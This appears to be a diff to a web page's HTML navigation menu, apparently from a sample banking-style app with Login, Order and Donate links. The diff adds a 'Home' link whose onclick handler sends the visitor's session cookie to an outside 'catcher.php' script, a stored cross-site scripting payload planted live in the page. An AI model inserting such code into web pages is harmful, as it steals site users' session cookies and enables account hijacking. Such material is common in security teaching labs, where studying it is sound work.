@@ -46,7 +46,12 @@
 
 <div id="navigation">
   
+
       <ul>
+
+         <li>  <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Home </a>
+
+
          <li><a href="home.php">Login</a></li>
          <li><a href="buylist.php">Order</a></li>
          <li><a href="transfer.php">Donate</a></li>
